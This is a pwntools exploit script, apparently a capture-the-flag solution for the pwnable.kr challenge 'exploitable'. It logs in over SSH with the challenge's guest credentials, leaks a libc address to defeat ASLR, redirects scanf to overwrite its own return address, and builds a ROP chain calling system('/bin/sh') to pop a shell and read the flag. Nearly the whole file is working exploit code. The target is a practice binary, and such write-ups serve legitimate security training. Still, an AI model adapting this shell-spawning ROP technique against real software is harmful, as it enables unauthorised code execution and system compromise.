#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass guest --user exploitable ./exploitable
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./exploitable")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 2222)
user = args.USER or "exploitable"
password = args.PASSWORD or "guest"
remote_path = "exploitable"

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Execute the target binary on the remote host"""
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.connect_remote("127.0.0.1", 9018)


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

context.terminal = ["kitty"]


def to_signed(num: int) -> int:
    return u32(p32(num), signed=True)


libc = ELF("./libc.so.6")

io = start()

# obtain libc address
stdout_addr = u32(io.recv(4))

libc.address = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
info(f"found libc base address 0x{libc.address:x}")

# JUMP
# first jump to the add esp, 30h & jump (just before scanf in main) gadget (which makes esp closer to ebp)
io.sendline(str(0x08048561).encode())
# now as esp is closer to ebp it turns out that scanf's argument is just a pointer to esp-4 thus writes directly tu scanf return address!
# jump to gets, which will give as a stack write primitive (which we can ROP)
io.send(str(to_signed(libc.symbols["gets"])).encode())

# ROP
BIN_SH_ADDR = next(libc.search(b"/bin/sh\x00"))

rop_ = b"A" * 4  # saved ebp
rop_ += p32(libc.symbols["system"])  # target function
rop_ += b"B" * 4  # return address
rop_ += p32(BIN_SH_ADDR)  # arg1

assert b"\n" not in rop_

io.sendline(rop_)

# flag
success("waiting for shell to pop")
time.sleep(1)

io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
